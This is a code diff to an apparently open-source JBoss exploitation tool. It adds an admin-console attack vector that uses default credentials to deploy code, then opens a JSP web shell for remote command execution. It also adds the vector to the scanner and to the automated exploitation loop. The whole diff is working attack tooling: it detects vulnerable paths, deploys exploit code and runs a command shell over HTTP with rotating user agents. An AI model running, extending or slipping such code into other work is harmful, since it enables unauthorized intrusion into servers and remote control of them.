@@ -28,7 +28,7 @@ NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.0.6"
+__version = "1.0.7"
 
 from sys import argv, exit, version_info
 from _exploits import *
@@ -111,7 +111,8 @@ def check_vul(url):
 
     paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
              "web-console" 	: "/web-console/ServerInfo.jsp",
-             "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
+             "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
+             "admin-console" : "/admin-console/"}
 
     for i in paths.keys():
         try:
@@ -122,7 +123,10 @@ def check_vul(url):
                 url_redirect = r.get_redirect_location()
                 print(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
             elif paths[i] == 200 or paths[i] == 500:
-                print(RED + "[ VULNERABLE ]" + ENDC)
+                if i == "admin-console":
+                    print(RED + "[ EXPOSED ]" + ENDC)
+                else:
+                    print(RED + "[ VULNERABLE ]" + ENDC)
             else:
                 print(GREEN + "[ OK ]")
         except:
@@ -140,6 +144,7 @@ def auto_exploit(url, exploit_type):
     exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
     exploitWebConsoleInvoker:		 tested and working in JBoss 4
     exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
+    exploitAdminConsole: tested and working in JBoss 6 (with default password)
     """
     print(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
     result = 505
@@ -153,6 +158,8 @@ def auto_exploit(url, exploit_type):
         result = exploit_jmx_invoker_file_repository(url, 0)
         if result != 200 and result != 500:
             result = exploit_jmx_invoker_file_repository(url, 1)
+    elif exploit_type == "admin-console":
+        result = exploit_admin_console(url)
 
     if result == 200 or result == 500:
         print(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
@@ -172,7 +179,7 @@ def shell_http(url, shell_type):
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
-    if shell_type == "jmx-console" or shell_type == "web-console":
+    if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
         path = '/jexws/jexws.jsp?'
     elif shell_type == "JMXInvokerServlet":
         path = '/jexinv/jexinv.jsp?'
@@ -279,7 +286,7 @@ def main():
     scan_results = check_vul(url)
 
     # performs exploitation
-    for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
+    for i in ["jmx-console", "web-console", "JMXInvokerServlet", "admin-console"]:
         if scan_results[i] == 200 or scan_results[i] == 500:
             print(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
                   BOLD + i + NORMAL + "\" ?\n" +
